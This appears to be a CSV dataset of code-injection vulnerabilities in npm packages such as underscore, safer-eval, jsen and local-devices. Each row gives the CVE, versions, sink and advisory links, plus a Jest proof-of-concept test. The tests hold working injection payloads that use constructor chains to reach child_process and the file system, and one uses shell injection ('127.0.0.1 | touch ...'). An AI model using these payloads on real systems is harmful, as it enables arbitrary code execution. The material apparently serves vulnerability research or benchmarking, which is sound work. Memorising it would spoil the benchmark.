Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
code-injection,CVE-2020-7609,node-rules,3.0.0,5.0.0,code-injection/node-rules_3.0.0,"test(""Arbitrary code execution in node-rules"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const A = require(""node-rules"");
  const path = ""./node-rules"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    var rules = {
      condition: ""{}.__proto__.toString = 222"",
      consequence: ""require(`fs`).writeFileSync(`node-rules`,``)"",
    };
    var a = new A();
    a.fromJSON(rules);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",n/a,lib/node-rules.js:245:33,https://security.snyk.io/vuln/SNYK-JS-NODERULES-560426; https://github.com/advisories/GHSA-f78f-353m-cf4j
code-injection,CVE-2020-7777,jsen,0.6.6,n/a,code-injection/jsen_0.6.6,"test(""Arbitrary code execution in jsen"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const jsen = require(""jsen"");
  const path = ""./jsen"";
  
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  
  let schema = JSON.parse(
    JSON.stringify({
      type: ""object"",
      properties: { username: { type: ""string"" } },
      required: [
        ""\""+clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync('touch jsen')+\""""
      ],
    })
  );
  try {
    const validate = jsen(schema);
    validate({});
  } catch (e) {}

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  
  fs.unlink(path, function (err) {});
});
",n/a,,https://security.snyk.io/vuln/SNYK-JS-JSEN-1014670; 
code-injection,,modjs,0.4.0,n/a,code-injection/modjs_0.4.0,"test(""Arbitrary code execution in modjs"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const sea = require(""modjs/lib/utils/sea"");
  const path = ""./modjs"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    sea.findSeajsConfig(
      ""seajs.config({a: require('fs').writeFileSync('./modjs', '')})""
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",n/a,lib/utils/sea.js:284:22,https://security.snyk.io/vuln/npm:modjs:20160407; 
code-injection,CVE-2021-23358,underscore,1.13.0-0,1.12.1,code-injection/underscore_1.13.0-0,"test(""Arbitrary code execution in underscore"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const _ = require(""underscore"");
  const path = ""./underscore"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  _.templateSettings.variable =
    ""a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)"";
  const t = _.template("""")();
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/jashkenas/underscore/commit/4c73526d43838ad6ab43a6134728776632adeb66,modules/template.js:71:14,https://github.com/advisories/GHSA-cf4h-3jhx-xvhq; 
code-injection,,mobile-icon-resizer,0.4.2,0.4.3,code-injection/mobile-icon-resizer_0.4.0,"test(""Arbitrary code execution in mobile-icon-resizer"", (done) => {
  expect.assertions(2);
  const fs = require(""fs"");
  const pathM = require(""path"");
  const resize = require(""mobile-icon-resizer"");
  const path = ""./mobile-icon-resizer"";
  
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  
  let options = {
    config: pathM.resolve(__dirname, ""./config"")
  };
  
  try {
    resize(options, function (err) {});
  } catch (e) {console.log(e)}
  
  file_exist = fs.existsSync(path);
  
  setTimeout(() => {
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
    done();
  }, 500);
});
",https://github.com/muzzley/mobile-icon-resizer/commit/a6c50f884bd282d74ab77e1fce6317d5d0dd2f0f,lib/resize.js:31:15,https://security.snyk.io/vuln/npm:mobile-icon-resizer:20160408; https://github.com/advisories/GHSA-mxjr-xmcg-fg7w
code-injection,CVE-2019-10759,safer-eval,1.3.1,1.3.4,code-injection/safer-eval_1.3.1,"test(""Arbitrary code execution in safer-eval"", () => {
  expect.assertions(2);
  const saferEval = require(""safer-eval"");
  expect({}.polluted).toBe(undefined);
  try {
    saferEval(
      ""console.constructor.constructor('return 1+(Object.prototype.polluted=`yes`)')().env""
    );
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/index.js:60:17,https://github.com/advisories/GHSA-r3x4-wr4h-pw33; https://security.snyk.io/vuln/SNYK-JS-SAFEREVAL-173772
code-injection,,kmc,1.2.2,n/a,code-injection/kmc_1.2.2,"test(""Arbitrary code execution in kmc"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  let kmc = require(""kmc/lib"");
  const path = ""./kmc"";
  let payload = ""red(); require('fs').writeFileSync('"" + path + ""',``); //"";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  fs.writeFileSync(
    ""./exploit.js"",
    ""//{requires:[require('fs').writeFileSync('kmc','')]});""
  );
  try {
    kmc.analyze(""./exploit.js"");
  } catch (e) {}
  fs.unlinkSync(""./exploit.js"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",n/a,lib/index.js:164:43,https://security.snyk.io/vuln/npm:kmc:20160407; 
code-injection,CVE-2020-7675,cd-messenger,2.7.24,n/a,code-injection/cd-messenger_2.7.24,"test(""Arbitrary code execution in cd-messenger"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const a = require(""cd-messenger"");
  const path = ""./cd-messenger"";
  let payload = ""red(); require('fs').writeFileSync('"" + path + ""',``); //"";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.line(payload);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",n/a,src/messenger-node.js:70:9,https://security.snyk.io/vuln/SNYK-JS-CDMESSENGER-571493; https://github.com/advisories/GHSA-v756-4whv-48vc
code-injection,,modulify,0.1.0,n/a,code-injection/modulify_0.1.0,"test(""Arbitrary code execution in modulify"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const modulify = require(""modulify"");
  const path = ""./modulify"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    modulify.utils.getGlobals(""require(`fs`).writeFileSync(`modulify`,``)"");
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",n/a,src/modulify.js:74:5,https://security.snyk.io/vuln/npm:modulify:20160407; 
code-injection,,mongo-parse,2.1.0,n/a,code-injection/mongo-parse_2.1.0,"test(""Arbitrary code execution in mongo-parse"", (done) => {
  expect.assertions(2);
  const fs = require(""fs"");
  const parser = require(""mongo-parse"");
  const path = ""./mongo-parse"";
  
  try {
    if (fs.existsSync(path)) fs.unlinkSync(path);
    console.log(""File removed:"", path);
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  
  try {
    let query = parser.parse(
      '} + clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync(""touch mongo-parse"") //'
    );
  } catch (error) {console.log(error)}
  
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 500);
});
",n/a,,https://security.snyk.io/vuln/npm:mongo-parse:20160408; 
code-injection,,local-devices,2.0.0,3.0.0,code-injection/local-devices_2.0.0,"test(""Arbitrary code execution in local-devices"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const find = require(""local-devices"");
  const path = ""./local-devices"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let userInput = ""127.0.0.1 | touch local-devices"";
  return find(userInput).then(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",n/a,src/index.js:114:13,https://security.snyk.io/vuln/SNYK-JS-LOCALDEVICES-459898; https://github.com/advisories/GHSA-w725-67p7-xv22
